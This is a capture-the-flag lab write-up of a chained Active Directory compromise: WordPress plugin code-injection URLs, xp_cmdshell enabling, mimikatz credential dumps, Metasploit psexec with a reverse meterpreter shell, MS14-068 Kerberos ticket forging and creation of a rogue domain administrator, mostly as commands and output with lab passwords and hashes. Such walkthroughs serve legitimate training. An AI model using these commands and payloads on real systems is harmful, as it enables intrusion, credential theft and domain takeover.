# Hacking Windows Active Directory

## Contents

```
1. Description
2. Workthrough
2.1 10.1.222.203
 2.1.1 Wordpress - Code Injection
2.2 10.1.222.200
 2.2.1 Port Scanning
 2.2.2 XP_CMDSHELL
2.3 10.1.222.201
 2.3.1 MS14-068
2.4 10.1.222.202
```
----

## Description

```
Description
    read Flag from C:\file.sys on Windows DC. Please find Windows DC yourself.

Target
    http://10.1.222.203 (The Start)

        10.1.222.200
        10.1.222.201
        10.1.222.202
        10.1.222.203 
```

----

## Workthrough

Attackmap:

```
---->[10.1.222.203]---->[10.1.222.200]---->[10.1.222.201]---->[10.1.222.202]
```


```
1. 10.1.222.203 
   wordpress vuln (code injecion).
   read password from wp-config.php
   login 10.1.222.200's SQL Server with the password.

2. 10.1.222.200 
   access SQL SERVER, and enable XP_CMDSHELL
   add a administrator user.

3. 10.1.222.201 
   exploit windows domain administrator with MS14-068
   a mstsc client on administrator's desktop

4. 10.1.222.202 
   get Windows DC Administrator Privilege.
```

----

### 10.1.222.203

http://10.1.222.203/ is a wordpress site, we can use wpscan](https://github.com/wpscanteam/wpscan) to identify vulns.


#### WORDPRESS

scan wordpress plugins with parameter 'p'.

```
┌─[✗]─[lab@core]─[/opt/wpscan]
└──╼ ruby wpscan.rb --url 10.1.222.203 --enumerate p
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __  
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team 
                       Version 2.8
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: http://10.1.222.203/
[+] Started: Tue Sep  8 03:21:27 2015

[+] robots.txt available under: 'http://10.1.222.203/robots.txt'
[!] The WordPress 'http://10.1.222.203/readme.html' file exists exposing a version number
[+] Interesting header: SERVER: Apache/2.4.7 (Ubuntu)
[+] Interesting header: X-POWERED-BY: PHP/5.5.9-1ubuntu4.12
[+] XML-RPC Interface available under: http://10.1.222.203/xmlrpc.php

[+] WordPress version 4.3 identified from meta generator

[+] WordPress theme in use: twentyfifteen - v1.3

[+] Name: twentyfifteen - v1.3
 |  Location: http://10.1.222.203/wp-content/themes/twentyfifteen/
 |  Readme: http://10.1.222.203/wp-content/themes/twentyfifteen/readme.txt
 |  Style URL: http://10.1.222.203/wp-content/themes/twentyfifteen/style.css
 |  Theme Name: Twenty Fifteen
 |  Theme URI: https://wordpress.org/themes/twentyfifteen/
 |  Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple,...
 |  Author: the WordPress team
 |  Author URI: https://wordpress.org/

[+] Enumerating installed plugins  ...

   Time: 00:03:46 <=============================================================> (1906 / 1906) 100.00% Time: 00:03:46

[+] We found 2 plugins:

[+] Name: akismet
 |  Location: http://10.1.222.203/wp-content/plugins/akismet/

[+] Name: cm-download-manager
 |  Location: http://10.1.222.203/wp-content/plugins/cm-download-manager/
 |  Readme: http://10.1.222.203/wp-content/plugins/cm-download-manager/readme.txt

[!] We could not determine a version so all vulnerabilities are printed out

[!] Title: CM Download Manager <= 2.0.0 - Code Injection
    Reference: https://wpvulndb.com/vulnerabilities/7679
    Reference: http://packetstormsecurity.com/files/129183/
    Reference: https://downloadsmanager.cminds.com/release-notes/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8877
    Reference: http://osvdb.org/show/osvdb/114867
    Reference: https://www.exploit-db.com/exploits/35324/
[i] Fixed in: 2.0.4

[!] Title: CM Download Manager <= 2.0.6 - XSS and CSRF
    Reference: https://wpvulndb.com/vulnerabilities/7756
    Reference: http://packetstormsecurity.com/files/129357/
    Reference: http://www.securityfocus.com/bid/71418/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9129
    Reference: http://osvdb.org/show/osvdb/115223
[i] Fixed in: 2.0.7

[+] Finished: Tue Sep  8 03:25:29 2015
[+] Requests Done: 2001
[+] Memory used: 41.98 MB
[+] Elapsed time: 00:04:02
```

Code Injection / Xss and CSRF are here.


#### Code Injection

Try to exploit the site with  **CM Download Manager <= 2.0.0 - Code Injection**, information:

```
http://10.1.222.203/cmdownloads/?CMDsearch=%22.phpinfo%28%29.%22
```

view disable functios from phpinfo page.

```
system,
exec,
shell_exec,
passthru,
popen,
dl,
proc_open,
popen,
curl_exec,
curl_multi_exec,
parse_ini_file,
show_source,
pcntl_alarm,
pcntl_fork,
pcntl_waitpid,
pcntl_wait,
pcntl_wifexited,
pcntl_wifstopped,
pcntl_wifsignaled,
pcntl_wexitstatus,
pcntl_wtermsig,
pcntl_wstopsig,
pcntl_signal,
pcntl_signal_dispatch,
pcntl_get_last_error,
pcntl_strerror,
pcntl_sigprocmask,
pcntl_sigwaitinfo,
pcntl_sigtimedwait,
pcntl_exec,
pcntl_getpriority,
pcntl_setpriority,
```

read wordpress configuration file **wp-config.php**:

```
http://10.1.222.203/cmdownloads/?CMDsearch=".print_r(scandir('.'))."
http://10.1.222.203/cmdownloads/?CMDsearch=".print_r(file_get_contents('wp-config.php'))."
```

**wp-config.php**'s contents as follow:

```
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */
/*
 * hello world!
 *
 *
 * =========================================================================
 * Hackers, Welcome Here：
 *
 * 1、Please keey everything work well；
 * 2、Maybe 10.1.222.203's root privilege is not important；
 * 3、Logging is enable, and don't try to destroy the lab machine；
 * 4、Targets：10.1.222.200、10.1.222.201、10.1.222.202、10.1.222.203 ；
 * 5、read C:\file.sys on Windows DC;
 * 6、Tools here: http://10.1.222.203/toolsforyou/
 * 7、Enjoy It!
 * 8. Happy Hacking !
*  =========================================================================
  * * /

 // ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'test');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'Xd1moYqFr');

/** MySQL hostname */
define('DB_HOST', '10.1.222.200');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         '^01/8T?sIYu5/zkZ/;5AcsN R5Nf0cy{aI4w%J5+_O1PWn!RBX8vje8Q|G:*2h_d');
define('SECURE_AUTH_KEY',  ',{0:g.r(ml9LY+lpe4EG-SQ`Np p@r+8g6hiRYy0VAoMn~h[2XBU{X83(]MMkajF');
define('LOGGED_IN_KEY',    'RO}{Eyw(<(J=g|6=b4*Q(f-Uk&XB3.Hv6 XTGg!+C9Du-86U4e.wY9+,Zz&h0 (_');
define('NONCE_KEY',        'SN2+N1ZA6v[a.QgfGsZHyq&8 tO. 4^FNrlea:|7ifM)m-Uy!H^;At-8MeqrwMRM');
define('AUTH_SALT',        'HE<}>b.$S.GKNy@cUXCezBJmGkVM~GO/R%jB}6y~@HY3 W{%+,]mkpbEjC|GQ73!');
define('SECURE_AUTH_SALT', '.0Jix9L(%)XxhlNA3~IFPKWs!jm|VJ_]}J))@jpQV_]T>T7)i-e@z#k0W^q/Eq[G');
define('LOGGED_IN_SALT',   'V2bk%aIT-yTnvcj7+n,).IVygEdkc<p8VDWw-E&D^hS)2dR%ld&vZv`He|fdxalN');
define('NONCE_SALT',       'r+zYG+^AcZFA3;|d0]@.;7]PD>[9@Jv[@eLZ-u;v#l&R%@g40x?:4CO/-?y)3t=]');
```

10.1.222.203's database is from 10.1.222.200.

----

### 10.1.222.200

#### Port Scanning

Scan open ports with nmap, and we find tcp/1433 - SQL Server.

```
Starting Nmap 6.47 ( http://nmap.org ) at 2015-09-08 12:04 China Standard Time
Initiating SYN Stealth Scan at 12:04
Scanning 10.1.222.200 [1000 ports]
Discovered open port 3306/tcp on 10.1.222.200
Discovered open port 139/tcp on 10.1.222.200
Discovered open port 135/tcp on 10.1.222.200
Discovered open port 3389/tcp on 10.1.222.200
Discovered open port 445/tcp on 10.1.222.200
Discovered open port 1433/tcp on 10.1.222.200
Discovered open port 49152/tcp on 10.1.222.200
Discovered open port 49156/tcp on 10.1.222.200
Discovered open port 49154/tcp on 10.1.222.200
Discovered open port 49155/tcp on 10.1.222.200
Discovered open port 49153/tcp on 10.1.222.200
Discovered open port 49157/tcp on 10.1.222.200
Completed SYN Stealth Scan at 12:04, 2.37s elapsed (1000 total ports)
Nmap scan report for 10.1.222.200
Host is up (0.060s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
3306/tcp  open  mysql
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown

Read data files from: C:\Program Files\Nmap
Nmap done: 1 IP address (1 host up) scanned in 2.52 seconds
           Raw packets sent: 1009 (44.396KB) | Rcvd: 1000 (40.048KB)

```

access SQL Server successfully with **sa/Xd1moYqFr**.
* Linux - Freetds [Usage](http://richbs.org/post/43142767072/connecting-to-microsoft-sql-server-from-unix).
* Windows - QueryExpress

#### XP\_CMDSHELL

connect to SQL SERVER (10.1.222.200:1433),

```
┌─[✗]─[lab@core]─[/opt]
└──╼ tsql -S egServer70 -U sa
Password: 
locale is "en_US.UTF-8"
locale charset is "UTF-8"
using default charset "UTF-8"
1> select @@version
2> go

Microsoft SQL Server 2008 R2 (RTM) - 10.50.1600.1 (X64) 
	Apr  2 2010 15:48:46 
	Copyright (c) Microsoft Corporation
	Standard Edition (64-bit) on Windows NT 6.1 <X64> (Build 7600: ) (Hypervisor)

(1 row affected)

```

database version: SQL SERVER 2008. enable XP\_CMDSHELL with commands.

```
1> EXEC sp_configure 'show advanced options',1
2> GO
Msg 15457 (severity 0, state 1) from DATABASE, Procedure sp_configure Line 174:
	"Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install."
(return status = 0)
1> RECONFIGURE
2> GO
1> EXEC sp_configure 'xp_cmdshell',1
2> GO
Msg 15457 (severity 0, state 1) from DATABASE, Procedure sp_configure Line 174:
	"Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install."
(return status = 0)
1> RECONFIGURE
2> GO
```

add a administrator with XP\_CMDSHELL.

```
1> EXEC xp_cmdshell 'whoami'
2> GO
output
nt authority\system
NULL
(2 rows affected)
(return status = 0)

1> EXEC xp_cmdshell 'wmic useraccount get name,sid'
2> GO
output
Name           SID                                           
Administrator  S-1-5-21-30580861-1793299886-3410204933-500   
ctfcx          S-1-5-21-30580861-1793299886-3410204933-1010  
Guest          S-1-5-21-30580861-1793299886-3410204933-501   
test           S-1-5-21-30580861-1793299886-3410204933-1015  

NULL
(7 rows affected)
(return status = 0)
1> 
```

add a administrator user, and access 10.1.222.200 successfully.
We can read clear passwords with mimikatz.

```
C:\Users\Administrator\Desktop\mimikatz_trunk\x64>mimikatz.exe

  .#####.   mimikatz 2.0 alpha (x64) release "Kiwi en C" (Aug 17 2015 00:14:48)
 .## ^ ##.
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
  '#####'                                     with 16 modules * * */


mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 111120 (00000000:0001b210)
Session           : RemoteInteractive from 2
User Name         : Administrator
Domain            : MASTER
Logon Server      : MASTER
Logon Time        : 2015/9/7 11:46:22
SID               : S-1-5-21-30580861-1793299886-3410204933-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : MASTER
         * LM       : b4d9e05213448dbd263365ce2184209e
         * NTLM     : 68f8b3e056dc171163f597288f47607e
         * SHA1     : 50af106ec94c0739cd235d8a858f6e4fb255b3d0
        tspkg :
         * Username : Administrator
         * Domain   : MASTER
         * Password : 6GbA6Crdw
        wdigest :
         * Username : Administrator
         * Domain   : MASTER
         * Password : 6GbA6Crdw
        kerberos :
         * Username : hanlei
         * Domain   : PENTEST.COM
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : MASTER$
Domain            : PENTEST
Logon Server      : (null)
Logon Time        : 2015/9/7 11:45:58
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : MASTER$
         * Domain   : PENTEST
         * NTLM     : af55bb72b1ca4ea6a3eac30216fac37b
         * SHA1     : 24e18ef140a487fa902f65a75db4cd075414656c
        tspkg :
        wdigest :
         * Username : MASTER$
         * Domain   : PENTEST
         * Password : % Xd^8W*+Ym0O&M^7zj'R2ResK!GPB%WNqrW2$3+i.B"N8h\,e!wbONFEpPu/#+VWiK2nYqs\s<yX`2CDO)I/sbD$pwUtiYN4\_ \zUh`,zWN;E`;S!xkcQ0
        kerberos :
         * Username : master$
         * Domain   : PENTEST.COM
         * Password : % Xd^8W*+Ym0O&M^7zj'R2ResK!GPB%WNqrW2$3+i.B"N8h\,e!wbONFEpPu/#+VWiK2nYqs\s<yX`2CDO)I/sbD$pwUtiYN4\_ \zUh`,zWN;E`;S!xkcQ0
        ssp :
        credman :

Authentication Id : 0 ; 35562 (00000000:00008aea)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2015/9/7 11:45:56
SID               :
        msv :
         [00000003] Primary
         * Username : MASTER$
         * Domain   : PENTEST
         * NTLM     : af55bb72b1ca4ea6a3eac30216fac37b
         * SHA1     : 24e18ef140a487fa902f65a75db4cd075414656c
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2015/9/7 11:45:58
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : MASTER$
Domain            : PENTEST
Logon Server      : (null)
Logon Time        : 2015/9/7 11:45:56
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : MASTER$
         * Domain   : PENTEST
         * Password : % Xd^8W*+Ym0O&M^7zj'R2ResK!GPB%WNqrW2$3+i.B"N8h\,e!wbONFEpPu/#+VWiK2nYqs\s<yX`2CDO)I/sbD$pwUtiYN4\_ \zUh`,zWN;E`;S!xkcQ0
        kerberos :
         * Username : master$
         * Domain   : PENTEST.COM
         * Password : % Xd^8W*+Ym0O&M^7zj'R2ResK!GPB%WNqrW2$3+i.B"N8h\,e!wbONFEpPu/#+VWiK2nYqs\s<yX`2CDO)I/sbD$pwUtiYN4\_ \zUh`,zWN;E`;S!xkcQ0
        ssp :
        credman :

mimikatz # exit
Bye!

```

We can also use **metasploit module exploit/windows/mssql/mssql\_payload** to get meterpreter shell. 

```
msf post(hashdump) > sessions -l

Active sessions
===============

  Id  Type                   Information                     Connection
  --  ----                   -----------                     ----------
  1   meterpreter x86/win32  NT AUTHORITY\SYSTEM @ DATABASE  10.255.254.23:8088 -> 10.1.222.200:56671 (10.1.222.200)

msf post(hashdump) > run

[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 89e7950dda3ecc11525391db37acf6a8...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hints...

No users with password hints on this system

[*] Dumping password hashes...


Administrator:500:aad3b435b51404eeaad3b435b51404ee:68f8b3e056dc171163f597288f47607e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::


[*] Post module execution completed
msf post(hashdump) > creds 
Credentials
===========

host          origin        service        public         private                                                            realm  private_type
----          ------        -------        ------         -------                                                            -----  ------------
10.1.222.200  10.1.222.200  445/tcp (smb)  administrator  aad3b435b51404eeaad3b435b51404ee:68f8b3e056dc171163f597288f47607e         NTLM hash
10.1.222.200  10.1.222.200  445/tcp (smb)  guest          aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0         NTLM hash

msf post(hashdump) > use post/windows/gather/credentials/sso
msf post(sso) > show options 

Module options (post/windows/gather/credentials/sso):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

msf post(sso) > set SESSION 1
SESSION => 1
msf post(sso) > run

[*] Running module against DATABASE
[-] x64 platform requires x64 meterpreter and mimikatz extension
[*] Post module execution completed


meterpreter > load mimikatz 
Loading extension mimikatz...
[!] Loaded x86 Mimikatz on an x64 architecture.
success.

```
We have got a meterpreter shell, and dumped windows users hash. When we use mimikatz, it shows us "Loaded x86 Mimikatz on an x64 architecture".
Target is windows 2008 x64, and x64 meterpreter shell is needed.

Hash is here, we can use **exploit/windows/smb/psexec** to exploit the target.

```
msf exploit(psexec) > show options 

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting                                                    Required  Description
   ----                  ---------------                                                    --------  -----------
   RHOST                 10.1.222.200                                                       yes       The target address
   RPORT                 445                                                                yes       Set the SMB service port
   SERVICE_DESCRIPTION                                                                      no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                     no        The service display name
   SERVICE_NAME                                                                             no        The service name
   SHARE                 ADMIN$                                                             yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             WORKGROUP                                                          no        The Windows domain to use for authentication
   SMBPass               aad3b435b51404eeaad3b435b51404ee:68f8b3e056dc171163f597288f47607e  no        The password for the specified username
   SMBUser               administrator                                                      no        The username to authenticate as


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: , , seh, thread, process, none)
   LHOST     10.255.254.23    yes       The listen address
   LPORT     8090             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(psexec) > run

[*] Started reverse handler on 10.255.254.23:8090 
[*] Connecting to the server...
[*] Authenticating to 10.1.222.200:445|WORKGROUP as user 'administrator'...
[*] Uploading payload...
[*] Created \kNXUXXOu.exe...
[+] 10.1.222.200:445 - Service started successfully...
[*] Sending stage (1105970 bytes) to 10.1.222.200
[*] Deleting \kNXUXXOu.exe...
[*] Meterpreter session 2 opened (10.255.254.23:8090 -> 10.1.222.200:56977) at 2015-09-08 13:41:18 +0000

meterpreter > load mimikatz 
Loading extension mimikatz...meterpreter > 
```

BINGO ! 

----

### 10.1.222.201

access 10.1.222.201 with  **Administrator/6GbA6Crdw**. On Administrator's desktop, a mstsc client here.

```
C:\Users\Desktop\Administrator\mstsc
```


#### MS14-068

Escalete windows domain admins privilege with ms14-068. we need access 10.1.222.201 from 10.1.222.200.

```
msf exploit(psexec) > route add 10.1.222.201 255.255.255.255 2
```

session 1 is x86 meterpreter shell, session 2 is x64 meterpreter shell.
Pwn 10.1.222.201 with **exploit/windows/smb/psexec** again as follow.

```
msf exploit(psexec) > sessions -l

Active sessions
===============

  Id  Type                   Information                     Connection
  --  ----                   -----------                     ----------
  1   meterpreter x86/win32  NT AUTHORITY\SYSTEM @ DATABASE  10.255.254.23:8088 -> 10.1.222.200:56671 (10.1.222.200)
  2   meterpreter x64/win64  NT AUTHORITY\SYSTEM @ DATABASE  10.255.254.23:8090 -> 10.1.222.200:56977 (10.1.222.200)
  3   meterpreter x64/win64  NT AUTHORITY\SYSTEM @ MASTER    10.255.254.23-10.1.222.200:0 -> 10.1.222.201:8090 (10.1.222.201)
```

we need access Windows DC - 10.1.222.202 from 10.1.222.201. Exploit Windows DC with ms14-068:

```
msf auxiliary(ms14_068_kerberos_checksum) > show options 

Module options (auxiliary/admin/kerberos/ms14_068_kerberos_checksum):

   Name      Current Setting                               Required  Description
   ----      ---------------                               --------  -----------
   DOMAIN    PENTEST.COM                                   yes       The Domain (upper case) Ex: DEMO.LOCAL
   PASSWORD  file:/tmp/pass.txt                            yes       The Domain User password
   RHOST     10.1.222.202                                  yes       The target address
   RPORT     88                                            yes       The target port
   Timeout   10                                            yes       The TCP timeout to establish connection and read data
   USER      MASTER                                        yes       The Domain User
   USER_SID  S-1-5-21-30580861-1793299886-3410204933-1008  yes       The Domain User SID, Ex: S-1-5-21-1755879683-3641577184-3486455962-1000

msf auxiliary(ms14_068_kerberos_checksum) > run

[*] Validating options...
[*] Using domain PENTEST.COM...
[*] 10.1.222.202:88 - Sending AS-REQ...
[!] 10.1.222.202:88 - KDC_ERR_PREAUTH_FAILED - Pre-authentication information was invalid
[-] 10.1.222.202:88 - Invalid AS-REP, aborting...
[*] Auxiliary module execution completed

C:\Windows\system32>wmic useraccount get name,sid
wmic useraccount get name,sid
Name           SID                                           
Administrator  S-1-5-21-30580861-1793299886-3410204933-500   
Guest          S-1-5-21-30580861-1793299886-3410204933-501   
Administrator  S-1-5-21-30580861-1793299886-3410204933-500   
Guest          S-1-5-21-30580861-1793299886-3410204933-501   
krbtgt         S-1-5-21-30580861-1793299886-3410204933-502   
hanlei         S-1-5-21-30580861-1793299886-3410204933-1110  
ctfcx          S-1-5-21-30580861-1793299886-3410204933-1111 
```

metasploit fails to exploit MS14-068 vulnerability. Try pykek again.

```
C:\Users\Administrator\Desktop\pykek-master>C:\Python27\python.exe ms14-068.py -u master@PENTEST.COM -s S-1-5-21-30580861-1793299886-3410204933-1008 -d DC.PENTEST.COM
Password:
  [+] Building AS-REQ for DC.PENTEST.COM... Done !
  [+] Sending AS-REQ to DC.PENTEST.COM... Done!
  [+] Receiving AS-REP from DC.PENTEST.COM... Done!
  [+] Parsing AS-REP from DC.PENTEST.COM... Done!
  [+] Building TGS-REQ for DC.PENTEST.COM... Done!
  [+] Sending TGS-REQ to DC.PENTEST.COM... Done!
  [+] Receiving TGS-REP from DC.PENTEST.COM... Done!
  [+] Parsing TGS-REP from DC.PENTEST.COM... Done!
  [+] Creating ccache file 'TGT_master@PENTEST.COM.ccache'... Done!
```

```
C:\Users\Administrator\Desktop\mimikatz_trunk\x64>mimikatz.exe 
mimikatz.exe 

  .#####.   mimikatz 2.0 alpha (x64) release "Kiwi en C" (Aug 17 2015 00:14:48)
 .## ^ ##.  
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
  '#####'                                     with 16 modules * * */


mimikatz # kerberos::ptc TGT_master@PENTEST.COM.ccache

Principal : (01) : MASTER ; @ PENTEST.COM

Data 0
	   Start/End/MaxRenew: 2015/9/8 22:55:52 ; 2015/9/9 8:55:52 ; 2015/9/15 22:55:52
	   Service Name (01) : krbtgt ; PENTEST.COM ; @ PENTEST.COM
	   Target Name  (01) : krbtgt ; PENTEST.COM ; @ PENTEST.COM
	   Client Name  (01) : MASTER ; @ PENTEST.COM
	   Flags 50a00000    : pre_authent ; renewable ; proxiable ; forwardable ; 
	   Session Key       : 0x00000017 - rc4_hmac_nt      
	     e42591d39858f8e3b0d16334351b692d
	   Ticket            : 0x00000000 - null              ; kvno = 2	[...]
	   * Injecting ticket : OK

mimikatz # exit
Bye!

C:\Users\Administrator\Desktop\mimikatz_trunk\x64>klist 
klist

��ǰ��¼ ID �� 0:0x3e7

������Ʊ֤: (1)

#0>	�ͻ���: MASTER @ PENTEST.COM
	������: krbtgt/PENTEST.COM @ PENTEST.COM
	Kerberos Ʊ֤��������: RSADSI RC4-HMAC(NT)
	Ʊ֤��־ 0x50a00000 -> forwardable proxiable renewable pre_authent 
	��ʼʱ��: 9/8/2015 22:55:52 (����)
	����ʱ��:   9/9/2015 8:55:52 (����)
	����ʱ��: 9/15/2015 22:55:52 (����)
	�Ự��Կ����: RSADSI RC4-HMAC(NT)
```

hoho ! We've got domain admins privilege.

```
C:\Users\Administrator\Desktop\mimikatz_trunk\x64>net user /domain
net user /domain
�������������� pentest.com ����������������


\\DC.pentest.com ���û��ʻ�

-------------------------------------------------------------------------------
Administrator            ctfcx                    Guest                    
hanlei                   krbtgt                   
�����������ϣ�������һ�����������

C:\Users\Administrator\Desktop\mimikatz_trunk\x64>net group "DOMAIN ADMINS" /domain
net group "DOMAIN ADMINS" /domain
�������������� pentest.com ����������������

����     Domain Admins
ע��     ָ����������Ա

��Ա


C:\Users\Administrator\Desktop\mimikatz_trunk\x64>net use \\DC.PENTEST.COM\ipc$
net use \\DC.PENTEST.COM\ipc$
�����ɹ����ɡ�


C:\Users\Administrator\Desktop\mimikatz_trunk\x64>dir \\DC.PENTEST.COM\c$\ 
dir \\DC.PENTEST.COM\c$\
 ������ \\DC.PENTEST.COM\c$ �еľ�û�б�ǩ��
 �������к��� 403D-792F

 \\DC.PENTEST.COM\c$ ��Ŀ¼

2015/08/19  10:25    <DIR>          inetpub
2009/07/14  11:20    <DIR>          PerfLogs
2015/08/13  14:58    <DIR>          Program Files
2015/08/13  14:58    <DIR>          Program Files (x86)
2015/09/08  09:20    <DIR>          Users
2015/08/24  16:56    <DIR>          Windows
               0 ���ļ�              0 �ֽ
               6 ��Ŀ¼ 25,048,915,968 �����ֽ

-------------------------------------------------------------------------------
Administrator            ctfcx                    
�����ɹ����ɡ�

```

###  Read Flags

```
C:\>klist
C:\>net use \\DC.pentest.com\admin$
C:\>net use k: \\DC.pentest.com\c$
C:\>type k:\file.sys
```

Flags as follow:

```
Hi dude, Congratulations!

You have my ass!!

this is the flag:4b329655c2275d7c956083dc899b1c89

Have a good day!
```

### Add A Domain Administrator

```
C:\Users\Administrator\Desktop\mimikatz_trunk\x64>net user demo pasPAS1234~ /add /domain
net user demo pasPAS1234~ /add /domain
�������������� pentest.com ����������������

�����ɹ����ɡ�

C:\Users\Administrator\Desktop\mimikatz_trunk\x64>net group "DOMAIN ADMINS" demo /add /domain
net group "DOMAIN ADMINS" demo /add /domain
�������������� pentest.com ����������������

�����ɹ����ɡ�
```

----

### 10.1.222.202

Pwn windows DC with demo/pasPAS1234~.


```
meterpreter > ssp 
[+] Running as SYSTEM
[*] Retrieving ssp credentials
ssp credentials
===============

AuthID  Package  Domain  User  Password
------  -------  ------  ----  --------

meterpreter > msv 
[+] Running as SYSTEM
[*] Retrieving msv credentials
msv credentials
===============

AuthID     Package    Domain        User           Password
------     -------    ------        ----           --------
0;996      Negotiate  PENTEST       DC$            lm{ 00000000000000000000000000000000 }, ntlm{ 5b2a87a70eb71e5adedf4209f478dca0 }
0;35844    NTLM                                    lm{ 00000000000000000000000000000000 }, ntlm{ 5b2a87a70eb71e5adedf4209f478dca0 }
0;145416   Kerberos   PENTEST       administrator  lm{ 00000000000000000000000000000000 }, ntlm{ 68a02ebe899dcb737cefa52adc48cafd }
0;1278946  Negotiate  PENTEST       demo           lm{ fdc5a70a13943d6273d1c29094e34430 }, ntlm{ 2ba4387de08ea1e1ee36d2a18c54b40c }
0;1278920  Kerberos   PENTEST       demo           lm{ fdc5a70a13943d6273d1c29094e34430 }, ntlm{ 2ba4387de08ea1e1ee36d2a18c54b40c }
0;997      Negotiate  NT AUTHORITY  LOCAL SERVICE  n.s. (Credentials KO)
0;999      Negotiate  PENTEST       DC$            n.s. (Credentials KO)

meterpreter > livessp 
[+] Running as SYSTEM
[*] Retrieving livessp credentials
livessp credentials
===================

AuthID     Package    Domain        User           Password
------     -------    ------        ----           --------
0;1278946  Negotiate  PENTEST       demo           n.a. (livessp KO)
0;1278920  Kerberos   PENTEST       demo           n.a. (livessp KO)
0;145416   Kerberos   PENTEST       administrator  n.a. (livessp KO)
0;996      Negotiate  PENTEST       DC$            n.a. (livessp KO)
0;35844    NTLM                                    n.a. (livessp KO)
0;997      Negotiate  NT AUTHORITY  LOCAL SERVICE  n.a. (livessp KO)
0;999      Negotiate  PENTEST       DC$            n.a. (livessp KO)

meterpreter > kerberos 
[+] Running as SYSTEM
[*] Retrieving kerberos credentials
kerberos credentials
====================

AuthID     Package    Domain        User           Password
------     -------    ------        ----           --------
0;35844    NTLM                                    
0;997      Negotiate  NT AUTHORITY  LOCAL SERVICE  
